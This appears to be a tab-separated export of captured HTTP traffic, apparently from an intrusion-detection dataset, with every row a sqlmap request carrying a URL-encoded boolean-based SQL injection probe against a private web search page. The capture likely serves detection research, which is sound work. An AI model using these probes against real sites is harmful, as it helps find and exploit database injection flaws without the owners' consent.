http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%22%29%20AND%209296%3D9405%20AND%20%28%22PSiF%22%20LIKE%20%22PSiF		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%22%29%20AND%209296%3D9405%20AND%20%28%22PSiF%22%20LIKE%20%22PSiF
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%22%29%20AND%207877%3D7877%20AND%20%28%22UPaX%22%20LIKE%20%22UPaX		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%22%29%20AND%207877%3D7877%20AND%20%28%22UPaX%22%20LIKE%20%22UPaX
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%22%29%20AND%206659%3D1098%20AND%20%28%22bTDg%22%20LIKE%20%22bTDg		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%22%29%20AND%206659%3D1098%20AND%20%28%22bTDg%22%20LIKE%20%22bTDg
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%22%20AND%209580%3D7651%20AND%20%22risL%22%20LIKE%20%22risL		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%22%20AND%209580%3D7651%20AND%20%22risL%22%20LIKE%20%22risL
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%22%20AND%207877%3D7877%20AND%20%22yrnB%22%20LIKE%20%22yrnB		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%22%20AND%207877%3D7877%20AND%20%22yrnB%22%20LIKE%20%22yrnB
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%22%20AND%207912%3D9679%20AND%20%22jsmN%22%20LIKE%20%22jsmN		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%22%20AND%207912%3D9679%20AND%20%22jsmN%22%20LIKE%20%22jsmN
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%27%20AND%204556%3D2729%20OR%20%27dfwW%27%3D%27JuTc		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%27%20AND%204556%3D2729%20OR%20%27dfwW%27%3D%27JuTc
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%27%20AND%207877%3D7877%20OR%20%27klmg%27%3D%27xmLy		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%27%20AND%207877%3D7877%20OR%20%27klmg%27%3D%27xmLy
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%27%20AND%204058%3D8251%20OR%20%27RvMZ%27%3D%27sxwa		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%27%20AND%204058%3D8251%20OR%20%27RvMZ%27%3D%27sxwa
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%29%20AND%207393%3D6473--%20ciFF		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%29%20AND%207393%3D6473--%20ciFF
